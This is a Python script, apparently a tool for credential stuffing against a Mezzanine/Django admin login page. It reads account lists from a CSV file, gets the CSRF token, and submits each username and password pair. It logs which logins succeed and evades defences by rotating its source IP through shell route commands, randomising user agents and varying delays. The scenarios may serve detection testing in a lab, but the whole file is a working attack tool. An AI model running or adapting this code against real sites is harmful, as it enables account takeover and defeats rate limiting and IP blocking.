# -*- coding: utf-8 -*-

import configparser
import csv
import logging
import os
import random
import subprocess
import sys
from logging import DEBUG, StreamHandler, getLogger
from time import sleep

import requests
from fake_useragent import UserAgent

import ipaddr

logger = getLogger(__name__)
handler = StreamHandler()
handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s', datefmt='%Y/%m/%d %I:%M:%S'))
handler.setLevel(DEBUG)
logger.setLevel(DEBUG)
logger.addHandler(handler)
logger.propagate = False
ua = UserAgent()


def path(file_name):
    return os.path.normpath(os.path.join(os.path.abspath('__file__'), '../{}'.format(file_name)))


def gen_ipaddr(ip_type, count):
    network = ipaddr.IPv4Network('101.0.0.0/8')
    if ip_type == "random":
        return ipaddr.IPv4Address(random.randrange(int(network.network) + 1, int(network.broadcast) - 1))
    elif ip_type == "increment":
        return ipaddr.IPv4Address(int(network.network) + count)
    else:
        logger.debug("{} don't exsit setting. you should set random or increment. ".format(ip_type))
        sys.exit(1)


def change_ipaddr(ip_addr):
    cmd_list = (
        "ip addr flush dev ens224",
        "ip addr add {}/8 dev ens224".format(ip_addr),
        "ip link set ens224 up",
        "route add -net 160.17.0.0 gw 111.255.255.254 netmask 255.255.0.0 dev ens224"
    )
    for cmd in cmd_list:
        try:
            proc = subprocess.Popen(cmd, shell=True)
            proc.wait()
        except Exception as e:
            logger.debug(e)


def acccess(http_info):
    request_info = http_info
    for key in ('payload', 'headers', 'querystring'):
        if key not in http_info:
            request_info[key] = {}

    try:
        res = requests.request(
            request_info['method'],
            request_info['url'],
            data=request_info['payload'],
            headers=request_info['headers'],
            params=request_info['querystring'],
        )
        return res
    except Exception as e:
        logger.debug(e)


def interval(config):
    max_ = int(config.get('interval', 'max'))
    min_ = int(config.get('interval', 'min'))
    if max_ == min_:
        sleep(min_)
    else:
        sleep(random.uniform(min_, max_))


def attacker(user, pass_, config):
    useragent = config.get('http_headers', 'User-Agent')
    if useragent == "random":
        useragent = ua.random

    cookie = acccess({
        'method': 'GET',
        'url': config.get('general', 'url'),
        'headers': {
            'User-Agent': useragent,
            'Cookie': '',
            'Referer': 'https://www.google.co.jp/search?hl=ja&ei=XfKSWpH2OYaa0gTJ0a7YDg&q=%E3%83%AA%E3%82%AF%E3%83%AB%E3%83%BC%E3%83%88%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88&oq=%E3%83%AA%E3%82%AF%E3%83%AB%E3%83%BC%E3%83%88%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88&gs_l=psy-ab.3..0i4k1l8.1991.3416.0.3708.8.8.0.0.0.0.94.651.8.8.0....0...1c.1j4.64.psy-ab..0.8.650....0.W-Q_jaj_izg',
            'Accept': config.get('http_headers', 'accept'),
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': config.get('http_headers', 'accept_language'),
            'Content-Type': 'text/html; charset=utf-8',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
        },
    }).cookies['csrftoken']
    interval(config)

    res = acccess({
        'method': 'POST',
        'url': config.get('general', 'url'),
        'querystring': {'next': '/ja/admin'},
        'payload': 'username={}&password={}&this_is_the_login_form=1&mezzanine_login_interface=admin&csrfmiddlewaretoken={}'.format(user, pass_, cookie),
        'headers': {
            'User-Agent': useragent,
            'Cookie': 'csrftoken={}'.format(cookie),
            'Referer': config.get('http_headers', 'referer'),
            'Accept': config.get('http_headers', 'accept'),
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': config.get('http_headers', 'accept_language'),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
        },
    })
    if res is not None:
        if "ダッシュボード" in res.text:
            result = "Succeeded"
        else:
            result = "Failed"
        logger.debug("User: {}, Pass: {}, Result: {}".format(user, pass_, result))
    else:
        logger.debug("response doesn't exsit. maybe, one or more http-headers are wrong.")
    interval(config)


def do_scenario(ip_type, count):
    ip = gen_ipaddr(ip_type, count)
    change_ipaddr(ip)
    logger.debug("ipaddress changed {}, chamged count {}".format(ip, count))


def main():
    config = configparser.SafeConfigParser()
    logger.debug(path('attacker.conf'))
    config.read(path('attacker.conf'))

    if config.get('general', 'scenario'):
        scenario = config.get('general', 'scenario')
    else:
        scenario = ""

    if config.get('general', 'loop'):
        loop_flag = config.get('general', 'loop')
    else:
        loop_flag = False

    with open(path('account_list.csv')) as f:
        reader = csv.reader(f)
        if config.get('general', 'account') == "username":
            account = 0
        elif config.get('general', 'account') == "email":
            account = 1
        else:
            logger.debug("Warn: doesn't exsit setting and so, set username account")
            account = 0

        count = 1
        param = 10

        while loop_flag:
            for row in reader:
                if scenario == "test0" or scenario == "test1":
                    do_scenario("random", count)
                    count += 1
                elif scenario == "test2":
                    do_scenario("increment", count)
                    count += 1
                elif scenario == "test3":
                    if ((reader.line_num - 1) % param) == 0 or count == 1:
                        do_scenario("random", count)
                        count += 1
                elif scenario == "test4":
                    if ((reader.line_num - 1) % param) == 0 or count == 1:
                        do_scenario("increment", count)
                        count += 1
                elif scenario == "test5":
                    if ((reader.line_num - 1) % random.randint(1, 20)) == 0 or count == 1:
                        do_scenario("random", count)
                        count += 1
                elif scenario == "test6":
                    if ((reader.line_num - 1) % random.randint(1, 20)) == 0 or count == 1:
                        do_scenario("increment", count)
                        count += 1
                else:
                    logger.debug("{} doesn't exsit setting. you should set test1~test6. ".format(scenario))
                    sys.exit(1)

                if scenario == "test0":
                    useragent = config.get('http_headers', 'User-Agent')
                    if useragent == "random":
                        useragent = ua.random
                    acccess({
                        'method': 'GET',
                        'url': config.get('general', 'url'),
                        'headers': {
                            'User-Agent': useragent,
                            'Cookie': '',
                            'Referer': 'https://www.google.co.jp/search?hl=ja&ei=XfKSWpH2OYaa0gTJ0a7YDg&q=%E3%83%AA%E3%82%AF%E3%83%AB%E3%83%BC%E3%83%88%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88&oq=%E3%83%AA%E3%82%AF%E3%83%AB%E3%83%BC%E3%83%88%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88&gs_l=psy-ab.3..0i4k1l8.1991.3416.0.3708.8.8.0.0.0.0.94.651.8.8.0....0...1c.1j4.64.psy-ab..0.8.650....0.W-Q_jaj_izg',
                            'Accept': config.get('http_headers', 'accept'),
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': config.get('http_headers', 'accept_language'),
                            'Content-Type': 'text/html; charset=utf-8',
                            'Connection': 'keep-alive',
                            'Cache-Control': 'no-cache',
                            'Upgrade-Insecure-Requests': '1',
                        },
                    })
                    interval(config)
                else:
                    attacker(str(row[account]), str(row[2]), config)


if __name__ == '__main__':
    main()
